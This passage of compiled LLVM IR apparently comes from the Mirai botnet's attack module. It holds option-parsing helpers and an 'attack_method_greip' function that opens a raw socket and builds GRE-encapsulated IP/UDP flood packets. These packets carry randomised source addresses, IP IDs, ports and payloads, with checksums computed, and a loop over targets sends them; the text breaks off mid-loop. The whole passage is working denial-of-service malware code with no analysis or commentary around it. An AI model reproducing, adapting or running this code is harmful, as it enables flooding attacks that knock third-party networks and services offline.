  %32 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %31, i32 0, i32 0
  %33 = load i8*, i8** %32, align 8
  store i8* %33, i8** %5, align 8
  br label %40

34:                                               ; preds = %16
  br label %35

35:                                               ; preds = %34
  %36 = load i32, i32* %10, align 4
  %37 = add nsw i32 %36, 1
  store i32 %37, i32* %10, align 4
  br label %11, !llvm.loop !12

38:                                               ; preds = %11
  %39 = load i8*, i8** %9, align 8
  store i8* %39, i8** %5, align 8
  br label %40

40:                                               ; preds = %38, %27
  %41 = load i8*, i8** %5, align 8
  ret i8* %41
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @attack_get_opt_int(i8 noundef zeroext %0, %struct.attack_option* noundef %1, i8 noundef zeroext %2, i32 noundef %3) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 noundef zeroext %11, %struct.attack_option* noundef %12, i8 noundef zeroext %13, i8* noundef null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

17:                                               ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %22

19:                                               ; preds = %4
  %20 = load i8*, i8** %10, align 8
  %21 = call i32 @util_atoi(i8* noundef %20, i32 noundef 10)
  store i32 %21, i32* %5, align 4
  br label %22

22:                                               ; preds = %19, %17
  %23 = load i32, i32* %5, align 4
  ret i32 %23
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @attack_get_opt_ip(i8 noundef zeroext %0, %struct.attack_option* noundef %1, i8 noundef zeroext %2, i32 noundef %3) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 noundef zeroext %11, %struct.attack_option* noundef %12, i8 noundef zeroext %13, i8* noundef null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

17:                                               ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %22

19:                                               ; preds = %4
  %20 = load i8*, i8** %10, align 8
  %21 = call i32 @inet_addr(i8* noundef %20) #7
  store i32 %21, i32* %5, align 4
  br label %22

22:                                               ; preds = %19, %17
  %23 = load i32, i32* %5, align 4
  ret i32 %23
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8* noundef) #1

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @attack_method_greip(i8 noundef zeroext %0, %struct.attack_target* noundef %1, i8 noundef zeroext %2, %struct.attack_option* noundef %3) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i32, align 4
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.grehdr*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.grehdr*, align 8
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.udphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %33 = load i8, i8* %5, align 1
  %34 = zext i8 %33 to i64
  %35 = call noalias i8* @calloc(i64 noundef %34, i64 noundef 8) #7
  %36 = bitcast i8* %35 to i8**
  store i8** %36, i8*** %11, align 8
  %37 = load i8, i8* %7, align 1
  %38 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %39 = call i32 @attack_get_opt_int(i8 noundef zeroext %37, %struct.attack_option* noundef %38, i8 noundef zeroext 2, i32 noundef 0)
  %40 = trunc i32 %39 to i8
  store i8 %40, i8* %12, align 1
  %41 = load i8, i8* %7, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %43 = call i32 @attack_get_opt_int(i8 noundef zeroext %41, %struct.attack_option* noundef %42, i8 noundef zeroext 3, i32 noundef 65535)
  %44 = trunc i32 %43 to i16
  store i16 %44, i16* %13, align 2
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 noundef zeroext %45, %struct.attack_option* noundef %46, i8 noundef zeroext 4, i32 noundef 64)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %14, align 1
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 noundef zeroext %49, %struct.attack_option* noundef %50, i8 noundef zeroext 5, i32 noundef 1)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %15, align 1
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 noundef zeroext %53, %struct.attack_option* noundef %54, i8 noundef zeroext 6, i32 noundef 65535)
  %56 = trunc i32 %55 to i16
  store i16 %56, i16* %16, align 2
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 noundef zeroext %57, %struct.attack_option* noundef %58, i8 noundef zeroext 7, i32 noundef 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %17, align 2
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 noundef zeroext %61, %struct.attack_option* noundef %62, i8 noundef zeroext 0, i32 noundef 512)
  store i32 %63, i32* %18, align 4
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 noundef zeroext %64, %struct.attack_option* noundef %65, i8 noundef zeroext 1, i32 noundef 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %19, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 noundef zeroext %68, %struct.attack_option* noundef %69, i8 noundef zeroext 19, i32 noundef 0)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = load i32, i32* @LOCAL_ADDR, align 4
  %75 = call i32 @attack_get_opt_int(i8 noundef zeroext %72, %struct.attack_option* noundef %73, i8 noundef zeroext 25, i32 noundef %74)
  store i32 %75, i32* %21, align 4
  %76 = call i32 @socket(i32 noundef 2, i32 noundef 3, i32 noundef 6) #7
  store i32 %76, i32* %10, align 4
  %77 = icmp eq i32 %76, -1
  br i1 %77, label %78, label %79

78:                                               ; preds = %4
  br label %433

79:                                               ; preds = %4
  store i32 1, i32* %9, align 4
  %80 = load i32, i32* %10, align 4
  %81 = bitcast i32* %9 to i8*
  %82 = call i32 @setsockopt(i32 noundef %80, i32 noundef 0, i32 noundef 3, i8* noundef %81, i32 noundef 4) #7
  %83 = icmp eq i32 %82, -1
  br i1 %83, label %84, label %87

84:                                               ; preds = %79
  %85 = load i32, i32* %10, align 4
  %86 = call i32 @close(i32 noundef %85)
  br label %433

87:                                               ; preds = %79
  store i32 0, i32* %9, align 4
  br label %88

88:                                               ; preds = %238, %87
  %89 = load i32, i32* %9, align 4
  %90 = load i8, i8* %5, align 1
  %91 = zext i8 %90 to i32
  %92 = icmp slt i32 %89, %91
  br i1 %92, label %93, label %241

93:                                               ; preds = %88
  %94 = call noalias i8* @calloc(i64 noundef 1510, i64 noundef 8) #7
  %95 = load i8**, i8*** %11, align 8
  %96 = load i32, i32* %9, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds i8*, i8** %95, i64 %97
  store i8* %94, i8** %98, align 8
  %99 = load i8**, i8*** %11, align 8
  %100 = load i32, i32* %9, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds i8*, i8** %99, i64 %101
  %103 = load i8*, i8** %102, align 8
  %104 = bitcast i8* %103 to %struct.iphdr*
  store %struct.iphdr* %104, %struct.iphdr** %22, align 8
  %105 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %106 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %105, i64 1
  %107 = bitcast %struct.iphdr* %106 to %struct.grehdr*
  store %struct.grehdr* %107, %struct.grehdr** %23, align 8
  %108 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %109 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %108, i64 1
  %110 = bitcast %struct.grehdr* %109 to %struct.iphdr*
  store %struct.iphdr* %110, %struct.iphdr** %24, align 8
  %111 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %112 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %111, i64 1
  %113 = bitcast %struct.iphdr* %112 to %struct.udphdr*
  store %struct.udphdr* %113, %struct.udphdr** %25, align 8
  %114 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %115 = bitcast %struct.iphdr* %114 to i8*
  %116 = load i8, i8* %115, align 4
  %117 = and i8 %116, 15
  %118 = or i8 %117, 64
  store i8 %118, i8* %115, align 4
  %119 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %120 = bitcast %struct.iphdr* %119 to i8*
  %121 = load i8, i8* %120, align 4
  %122 = and i8 %121, -16
  %123 = or i8 %122, 5
  store i8 %123, i8* %120, align 4
  %124 = load i8, i8* %12, align 1
  %125 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %126 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %125, i32 0, i32 1
  store i8 %124, i8* %126, align 1
  %127 = load i32, i32* %18, align 4
  %128 = sext i32 %127 to i64
  %129 = add i64 52, %128
  %130 = trunc i64 %129 to i16
  %131 = call zeroext i16 @htons(i16 noundef zeroext %130) #8
  %132 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %133 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %132, i32 0, i32 2
  store i16 %131, i16* %133, align 2
  %134 = load i16, i16* %13, align 2
  %135 = call zeroext i16 @htons(i16 noundef zeroext %134) #8
  %136 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %137 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %136, i32 0, i32 3
  store i16 %135, i16* %137, align 4
  %138 = load i8, i8* %14, align 1
  %139 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %140 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %139, i32 0, i32 5
  store i8 %138, i8* %140, align 4
  %141 = load i8, i8* %15, align 1
  %142 = icmp ne i8 %141, 0
  br i1 %142, label %143, label %147

143:                                              ; preds = %93
  %144 = call zeroext i16 @htons(i16 noundef zeroext 16384) #8
  %145 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %146 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %145, i32 0, i32 4
  store i16 %144, i16* %146, align 2
  br label %147

147:                                              ; preds = %143, %93
  %148 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %149 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %148, i32 0, i32 6
  store i8 47, i8* %149, align 1
  %150 = load i32, i32* %21, align 4
  %151 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %152 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %151, i32 0, i32 8
  store i32 %150, i32* %152, align 4
  %153 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %154 = load i32, i32* %9, align 4
  %155 = sext i32 %154 to i64
  %156 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %153, i64 %155
  %157 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %156, i32 0, i32 1
  %158 = load i32, i32* %157, align 4
  %159 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %160 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %159, i32 0, i32 9
  store i32 %158, i32* %160, align 4
  %161 = call zeroext i16 @htons(i16 noundef zeroext 2048) #8
  %162 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %163 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %162, i32 0, i32 1
  store i16 %161, i16* %163, align 2
  %164 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %165 = bitcast %struct.iphdr* %164 to i8*
  %166 = load i8, i8* %165, align 4
  %167 = and i8 %166, 15
  %168 = or i8 %167, 64
  store i8 %168, i8* %165, align 4
  %169 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %170 = bitcast %struct.iphdr* %169 to i8*
  %171 = load i8, i8* %170, align 4
  %172 = and i8 %171, -16
  %173 = or i8 %172, 5
  store i8 %173, i8* %170, align 4
  %174 = load i8, i8* %12, align 1
  %175 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %176 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %175, i32 0, i32 1
  store i8 %174, i8* %176, align 1
  %177 = load i32, i32* %18, align 4
  %178 = sext i32 %177 to i64
  %179 = add i64 28, %178
  %180 = trunc i64 %179 to i16
  %181 = call zeroext i16 @htons(i16 noundef zeroext %180) #8
  %182 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %183 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %182, i32 0, i32 2
  store i16 %181, i16* %183, align 2
  %184 = load i16, i16* %13, align 2
  %185 = zext i16 %184 to i32
  %186 = xor i32 %185, -1
  %187 = trunc i32 %186 to i16
  %188 = call zeroext i16 @htons(i16 noundef zeroext %187) #8
  %189 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %190 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i32 0, i32 3
  store i16 %188, i16* %190, align 4
  %191 = load i8, i8* %14, align 1
  %192 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %193 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %192, i32 0, i32 5
  store i8 %191, i8* %193, align 4
  %194 = load i8, i8* %15, align 1
  %195 = icmp ne i8 %194, 0
  br i1 %195, label %196, label %200

196:                                              ; preds = %147
  %197 = call zeroext i16 @htons(i16 noundef zeroext 16384) #8
  %198 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %199 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %198, i32 0, i32 4
  store i16 %197, i16* %199, align 2
  br label %200

200:                                              ; preds = %196, %147
  %201 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %202 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %201, i32 0, i32 6
  store i8 17, i8* %202, align 1
  %203 = call i32 @rand_next()
  %204 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %205 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %204, i32 0, i32 8
  store i32 %203, i32* %205, align 4
  %206 = load i8, i8* %20, align 1
  %207 = icmp ne i8 %206, 0
  br i1 %207, label %208, label %214

208:                                              ; preds = %200
  %209 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %210 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %209, i32 0, i32 9
  %211 = load i32, i32* %210, align 4
  %212 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %213 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %212, i32 0, i32 9
  store i32 %211, i32* %213, align 4
  br label %222

214:                                              ; preds = %200
  %215 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %216 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %215, i32 0, i32 8
  %217 = load i32, i32* %216, align 4
  %218 = sub i32 %217, 1024
  %219 = xor i32 %218, -1
  %220 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %221 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %220, i32 0, i32 9
  store i32 %219, i32* %221, align 4
  br label %222

222:                                              ; preds = %214, %208
  %223 = load i16, i16* %16, align 2
  %224 = call zeroext i16 @htons(i16 noundef zeroext %223) #8
  %225 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %226 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %225, i32 0, i32 0
  store i16 %224, i16* %226, align 2
  %227 = load i16, i16* %17, align 2
  %228 = call zeroext i16 @htons(i16 noundef zeroext %227) #8
  %229 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %230 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %229, i32 0, i32 1
  store i16 %228, i16* %230, align 2
  %231 = load i32, i32* %18, align 4
  %232 = sext i32 %231 to i64
  %233 = add i64 8, %232
  %234 = trunc i64 %233 to i16
  %235 = call zeroext i16 @htons(i16 noundef zeroext %234) #8
  %236 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %237 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %236, i32 0, i32 2
  store i16 %235, i16* %237, align 2
  br label %238

238:                                              ; preds = %222
  %239 = load i32, i32* %9, align 4
  %240 = add nsw i32 %239, 1
  store i32 %240, i32* %9, align 4
  br label %88, !llvm.loop !13

241:                                              ; preds = %88
  br label %242

242:                                              ; preds = %432, %241
  store i32 0, i32* %9, align 4
  br label %243

243:                                              ; preds = %429, %242
  %244 = load i32, i32* %9, align 4
  %245 = load i8, i8* %5, align 1
  %246 = zext i8 %245 to i32
  %247 = icmp slt i32 %244, %246
  br i1 %247, label %248, label %432

248:                                              ; preds = %243
  %249 = load i8**, i8*** %11, align 8
  %250 = load i32, i32* %9, align 4
  %251 = sext i32 %250 to i64
  %252 = getelementptr inbounds i8*, i8** %249, i64 %251
  %253 = load i8*, i8** %252, align 8
  store i8* %253, i8** %26, align 8
  %254 = load i8*, i8** %26, align 8
  %255 = bitcast i8* %254 to %struct.iphdr*
  store %struct.iphdr* %255, %struct.iphdr** %27, align 8
  %256 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %257 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %256, i64 1
  %258 = bitcast %struct.iphdr* %257 to %struct.grehdr*
  store %struct.grehdr* %258, %struct.grehdr** %28, align 8
  %259 = load %struct.grehdr*, %struct.grehdr** %28, align 8
  %260 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %259, i64 1
  %261 = bitcast %struct.grehdr* %260 to %struct.iphdr*
  store %struct.iphdr* %261, %struct.iphdr** %29, align 8
  %262 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %263 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %262, i64 1
  %264 = bitcast %struct.iphdr* %263 to %struct.udphdr*
  store %struct.udphdr* %264, %struct.udphdr** %30, align 8
  %265 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %266 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %265, i64 1
  %267 = bitcast %struct.udphdr* %266 to i8*
  store i8* %267, i8** %31, align 8
  %268 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %269 = load i32, i32* %9, align 4
  %270 = sext i32 %269 to i64
  %271 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %268, i64 %270
  %272 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %271, i32 0, i32 2
  %273 = load i8, i8* %272, align 4
  %274 = zext i8 %273 to i32
  %275 = icmp slt i32 %274, 32
  br i1 %275, label %276, label %297

276:                                              ; preds = %248
  %277 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %278 = load i32, i32* %9, align 4
  %279 = sext i32 %278 to i64
  %280 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %277, i64 %279
  %281 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %280, i32 0, i32 1
  %282 = load i32, i32* %281, align 4
  %283 = call i32 @ntohl(i32 noundef %282) #8
  %284 = call i32 @rand_next()
  %285 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %286 = load i32, i32* %9, align 4
  %287 = sext i32 %286 to i64
  %288 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %285, i64 %287
  %289 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %288, i32 0, i32 2
  %290 = load i8, i8* %289, align 4
  %291 = zext i8 %290 to i32
  %292 = lshr i32 %284, %291
  %293 = add i32 %283, %292
  %294 = call i32 @htonl(i32 noundef %293) #8
  %295 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %296 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %295, i32 0, i32 9
  store i32 %294, i32* %296, align 4
  br label %297

297:                                              ; preds = %276, %248
  %298 = load i32, i32* %21, align 4
  %299 = icmp eq i32 %298, -1
  br i1 %299, label %300, label %304

300:                                              ; preds = %297
  %301 = call i32 @rand_next()
  %302 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %303 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %302, i32 0, i32 8
  store i32 %301, i32* %303, align 4
  br label %304

304:                                              ; preds = %300, %297
  %305 = load i16, i16* %13, align 2
  %306 = zext i16 %305 to i32
  %307 = icmp eq i32 %306, 65535
  br i1 %307, label %308, label %323

308:                                              ; preds = %304
  %309 = call i32 @rand_next()
  %310 = and i32 %309, 65535
  %311 = trunc i32 %310 to i16
  %312 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %313 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %312, i32 0, i32 3
  store i16 %311, i16* %313, align 4
  %314 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %315 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %314, i32 0, i32 3
  %316 = load i16, i16* %315, align 4
  %317 = zext i16 %316 to i32
  %318 = sub nsw i32 %317, 1000
  %319 = xor i32 %318, -1
  %320 = trunc i32 %319 to i16
  %321 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %322 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %321, i32 0, i32 3
  store i16 %320, i16* %322, align 4
  br label %323

323:                                              ; preds = %308, %304
  %324 = load i16, i16* %16, align 2
  %325 = zext i16 %324 to i32
  %326 = icmp eq i32 %325, 65535
  br i1 %326, label %327, label %333

327:                                              ; preds = %323
  %328 = call i32 @rand_next()
  %329 = and i32 %328, 65535
  %330 = trunc i32 %329 to i16
  %331 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %332 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %331, i32 0, i32 0
  store i16 %330, i16* %332, align 2
  br label %333

333:                                              ; preds = %327, %323
  %334 = load i16, i16* %17, align 2
  %335 = zext i16 %334 to i32
  %336 = icmp eq i32 %335, 65535
  br i1 %336, label %337, label %343

337:                                              ; preds = %333
  %338 = call i32 @rand_next()
  %339 = and i32 %338, 65535
  %340 = trunc i32 %339 to i16
  %341 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %342 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %341, i32 0, i32 1
  store i16 %340, i16* %342, align 2
  br label %343

343:                                              ; preds = %337, %333
  %344 = load i8, i8* %20, align 1
  %345 = icmp ne i8 %344, 0
  br i1 %345, label %350, label %346

346:                                              ; preds = %343
  %347 = call i32 @rand_next()
  %348 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %349 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %348, i32 0, i32 9
  store i32 %347, i32* %349, align 4
  br label %356

350:                                              ; preds = %343
  %351 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %352 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %351, i32 0, i32 9
  %353 = load i32, i32* %352, align 4
  %354 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %355 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %354, i32 0, i32 9
  store i32 %353, i32* %355, align 4
  br label %356

356:                                              ; preds = %350, %346
  %357 = load i8, i8* %19, align 1
  %358 = icmp ne i8 %357, 0
  br i1 %358, label %359, label %362

359:                                              ; preds = %356
  %360 = load i8*, i8** %31, align 8
  %361 = load i32, i32* %18, align 4
  call void @rand_str(i8* noundef %360, i32 noundef %361)
  br label %362

362:                                              ; preds = %359, %356
  %363 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %364 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %363, i32 0, i32 7
  store i16 0, i16* %364, align 2
  %365 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %366 = bitcast %struct.iphdr* %365 to i16*
  %367 = call zeroext i16 @checksum_generic(i16* noundef %366, i32 noundef 20)
  %368 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %369 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %368, i32 0, i32 7
  store i16 %367, i16* %369, align 2
  %370 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %371 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %370, i32 0, i32 7
  store i16 0, i16* %371, align 2
  %372 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %373 = bitcast %struct.iphdr* %372 to i16*
  %374 = call zeroext i16 @checksum_generic(i16* noundef %373, i32 noundef 20)
  %375 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %376 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %375, i32 0, i32 7
  store i16 %374, i16* %376, align 2
  %377 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %378 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %377, i32 0, i32 3
  store i16 0, i16* %378, align 2
  %379 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %380 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %381 = bitcast %struct.udphdr* %380 to i8*
  %382 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %383 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %382, i32 0, i32 2
  %384 = load i16, i16* %383, align 2
  %385 = load i32, i32* %18, align 4
  %386 = sext i32 %385 to i64
  %387 = add i64 8, %386
  %388 = trunc i64 %387 to i32
  %389 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* noundef %379, i8* noundef %381, i16 noundef zeroext %384, i32 noundef %388)
  %390 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %391 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %390, i32 0, i32 3
  store i16 %389, i16* %391, align 2
  %392 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %393 = load i32, i32* %9, align 4
  %394 = sext i32 %393 to i64
  %395 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %392, i64 %394
  %396 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %395, i32 0, i32 0
  %397 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %396, i32 0, i32 0
  store i16 2, i16* %397, align 4
  %398 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %399 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %398, i32 0, i32 9
  %400 = load i32, i32* %399, align 4
  %401 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %402 = load i32, i32* %9, align 4
  %403 = sext i32 %402 to i64
  %404 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %401, i64 %403
  %405 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %404, i32 0, i32 0
  %406 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %405, i32 0, i32 2
  %407 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %406, i32 0, i32 0
  store i32 %400, i32* %407, align 4
  %408 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %409 = load i32, i32* %9, align 4
  %410 = sext i32 %409 to i64
  %411 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %408, i64 %410
  %412 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %411, i32 0, i32 0
  %413 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %412, i32 0, i32 1
  store i16 0, i16* %413, align 2
  %414 = load i32, i32* %10, align 4
  %415 = load i8*, i8** %26, align 8
  %416 = load i32, i32* %18, align 4
  %417 = sext i32 %416 to i64
  %418 = add i64 52, %417
  %419 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %420 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %421 = load i32, i32* %9, align 4
  %422 = sext i32 %421 to i64
  %423 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %420, i64 %422
